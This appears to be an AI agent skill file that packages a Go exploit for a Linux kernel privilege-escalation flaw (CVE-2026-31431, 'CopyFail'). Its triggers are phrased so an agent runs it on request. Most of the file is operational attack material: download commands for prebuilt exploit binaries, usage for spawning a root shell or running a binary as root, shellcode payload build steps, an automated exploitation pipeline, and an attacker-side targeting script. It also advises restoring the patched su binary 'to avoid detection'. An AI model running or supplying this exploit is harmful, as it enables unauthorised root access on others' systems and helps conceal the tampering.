---
name: copyfail-go-lpe
description: Go implementation of CVE-2026-31431 (CopyFail), a Linux local privilege escalation exploit targeting the AF_ALG iov_iter kernel vulnerability affecting kernels v4.14–April 2026.
triggers:
  - use copyfail-go to escalate privileges
  - exploit CVE-2026-31431 with Go binary
  - run copyfail static binary on Linux
  - get root shell with copyfail-go
  - build copyfail payloads from source
  - restore su binary after copyfail
  - check if kernel is vulnerable to copyfail
  - compile copyfail-go for target architecture
---

# CopyFail Go (CVE-2026-31431)

> Skill by [ara.so](https://ara.so) — Daily 2026 Skills collection.

CopyFail Go is a static Go binary implementation of CVE-2026-31431, a straight-line logic flaw in the Linux kernel's AF_ALG AEAD scatterlist handling. Unlike race-condition LPEs, it requires no timing window or kernel-specific offsets — the same binary roots every affected Linux distribution shipped since 2017.

**Affected kernel range:**
- **Floor:** `torvalds/linux 72548b093ee3` — August 2017, v4.14 (AF_ALG iov_iter rework)
- **Ceiling:** `torvalds/linux a664bf3d603d` — April 2026 (fix: separates source/destination scatterlists)

Confirmed vulnerable at disclosure: Ubuntu, RHEL, SUSE, Amazon Linux, Debian stock cloud images.

---

## How It Works

The exploit abuses the AF_ALG AEAD in-place optimization introduced in 2017, which allowed page-cache pages to be used as a writable crypto destination via splice. This enables writing arbitrary content to read-only file-backed pages — including setuid binaries like `/usr/bin/su`.

CopyFail-Go patches `/usr/bin/su` in-place via the kernel primitive, spawns a root shell, then restores the original binary.

---

## Getting the Binary

Download a prebuilt release from GitHub:

```bash
# x86_64
curl -L https://github.com/badsectorlabs/copyfail-go/releases/latest/download/copyfail-go_linux_amd64 -o copyfail-go
chmod +x copyfail-go

# ARM64
curl -L https://github.com/badsectorlabs/copyfail-go/releases/latest/download/copyfail-go_linux_arm64 -o copyfail-go
chmod +x copyfail-go

# ARM (32-bit)
curl -L https://github.com/badsectorlabs/copyfail-go/releases/latest/download/copyfail-go_linux_arm -o copyfail-go
chmod +x copyfail-go
```

---

## CLI Usage

### Interactive Root Shell

```bash
# Back up su, exploit, get shell, then restore
./copyfail-go --backup /tmp/su

# Once root shell spawns:
root@host# cat /tmp/su > /usr/bin/su
root@host# touch -r /tmp/su /usr/bin/su   # Restore original mtime
root@host# rm /tmp/su
```

### Run a Binary as Root

```bash
# Elevate a specific binary to root without interactive shell
./copyfail-go --backup /tmp/su --exec ./your-binary

# Restore su afterward using whatever mechanism your binary provides
```

### Flags

| Flag | Description |
|------|-------------|
| `--backup <path>` | Path to save the original `/usr/bin/su` before patching |
| `--exec <path>` | Execute a binary as root instead of spawning interactive shell |

---

## Verifying Kernel Vulnerability

Check if commit `a664bf3d603d` (or its distro backport) is present:

```bash
# On the target system — if this returns nothing, the kernel is likely vulnerable
grep -r "a664bf3d603d" /usr/share/doc/linux-image-$(uname -r)/changelog.gz 2>/dev/null | zcat | head

# Check kernel version date heuristic (not definitive)
uname -r
# Kernels from 2017–April 2026 without distro patch are in-window

# Debian/Ubuntu: check changelog
zcat /usr/share/doc/linux-image-$(uname -r)/changelog.Debian.gz 2>/dev/null | grep -i "algif\|AF_ALG\|a664bf3d"

# RHEL/CentOS: check RPM changelog
rpm -q --changelog kernel-$(uname -r) 2>/dev/null | grep -i "algif\|AF_ALG"
```

---

## Building from Source

### Prerequisites

```bash
# Install Go and goreleaser
go install github.com/goreleaser/goreleaser/v2@latest

# Install payload build dependencies (Debian 13 tested)
apt install nasm python3 binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf
```

### Build Payloads

```bash
# From the payloads/ directory — outputs zlib-compressed hex strings
cd payloads/
./build-n-print.sh
```

Compare output hex strings to those embedded in `main.go`, or replace them with your compiled payloads.

### Build All Binaries

```bash
# From project root
goreleaser build --snapshot --clean
# Outputs to dist/
```

### Build Single Target

```bash
# AMD64 only
GOOS=linux GOARCH=amd64 go build -o copyfail-go-amd64 .

# ARM64
GOOS=linux GOARCH=arm64 go build -o copyfail-go-arm64 .
```

---

## Payload Architecture

Payloads are NASM assembly stubs, compiled per-architecture, zlib-compressed, and embedded as hex strings in `main.go`:

```
payloads/
├── build-n-print.sh       # Compile all payloads and print hex
├── payload_amd64.asm      # x86_64 shellcode stub
├── payload_arm64.asm      # AArch64 shellcode stub
└── payload_arm.asm        # ARM32 shellcode stub
```

The Go binary detects architecture at runtime, selects the correct payload, decompresses it, and uses the AF_ALG splice primitive to write it into `/usr/bin/su`'s page cache.

---

## Restore Script

Always restore `/usr/bin/su` after exploitation to avoid detection and system breakage:

```bash
#!/bin/bash
# restore-su.sh — run as root after copyfail-go
BACKUP="${1:-/tmp/su}"

if [[ ! -f "$BACKUP" ]]; then
  echo "Backup not found: $BACKUP"
  exit 1
fi

cat "$BACKUP" > /usr/bin/su
touch -r "$BACKUP" /usr/bin/su
rm "$BACKUP"
echo "su restored successfully"
```

---

## Common Patterns

### Automated Exploitation Pipeline

```bash
#!/bin/bash
# Full exploit + command + restore cycle
BACKUP=$(mktemp /tmp/.su.XXXXXX)
COMMAND="${1:-id}"

./copyfail-go --backup "$BACKUP" --exec /bin/bash -c "$COMMAND"

# Restore (requires the --exec program to restore, or run restore-su.sh as root)
```

### Checking Binary Architecture Before Transfer

```bash
# On attacker machine — pick the right binary
TARGET_ARCH=$(ssh user@target uname -m)
case "$TARGET_ARCH" in
  x86_64)  BINARY="copyfail-go_linux_amd64" ;;
  aarch64) BINARY="copyfail-go_linux_arm64" ;;
  armv7l)  BINARY="copyfail-go_linux_arm" ;;
  *)       echo "Unsupported arch: $TARGET_ARCH"; exit 1 ;;
esac
echo "Use: $BINARY"
```

---

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|-------------|-----|
| `operation not permitted` on AF_ALG socket | Kernel already patched (`a664bf3d603d` present) | Target is not vulnerable |
| Binary exits immediately, no shell | Architecture mismatch | Verify `uname -m` and use correct binary |
| `su` broken after exploit | Backup path wrong or restore not run | Run `restore-su.sh` with correct backup path |
| Payload build fails | Missing `nasm` or cross-binutils | `apt install nasm binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf` |
| goreleaser build fails | Go version too old | Use Go 1.21+ |

### Verify the exploit primitive is available

```bash
# Check AF_ALG socket support (should return 0 if supported)
python3 -c "
import socket
try:
    s = socket.socket(41, socket.SOCK_SEQPACKET, 0)  # AF_ALG = 38 on Linux
    s.close()
    print('AF_ALG available')
except Exception as e:
    print(f'AF_ALG unavailable: {e}')
"
```

---

## References

- CVE details and writeup: [copy.fail](https://copy.fail)
- Original C implementation: [tgies/copy-fail-c](https://github.com/tgies/copy-fail-c)
- Kernel fix commit: `a664bf3d603d` (torvalds/linux, April 2026)
- Introducing commit (floor): `72548b093ee3` (torvalds/linux, August 2017)
